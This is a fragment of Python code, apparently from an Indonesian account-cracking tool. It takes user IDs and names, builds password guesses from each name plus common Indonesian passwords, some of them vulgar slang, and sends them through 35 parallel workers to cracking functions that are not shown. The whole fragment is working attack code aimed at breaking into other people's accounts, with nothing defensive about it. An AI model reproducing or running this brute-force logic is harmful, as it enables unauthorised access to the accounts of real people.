		...
		if(pil in ("y","Y")):
			...
			with Bool(max_workers=35) as kirim:
				...
				for email in id:
					uid,name=email.split("|")
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah','persib1933','persija1928','rahasia','indonesia']
					elif(len(str(name.lower()))<=2):
						pw=[name.lower()+'1234',name.lower()+'12345','bismillah']
					elif(len(str(name.lower()))<=3):
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah','doraemon','sayangku','bangsat','anjing','kontol','memeksia','sayangkamu']
					else:
						pw=[name.lower()+'12345','bismillah','123456','viking,thejack','viking1933','thejack1928','bandung','jakarta']
					if(tip in ("02","2")):
						kirim.submit(self.crack,uid,pw,name.lower())
					elif(tip in ("01","1")):
						kirim.submit(self.crack2,uid,pw,name.lower())
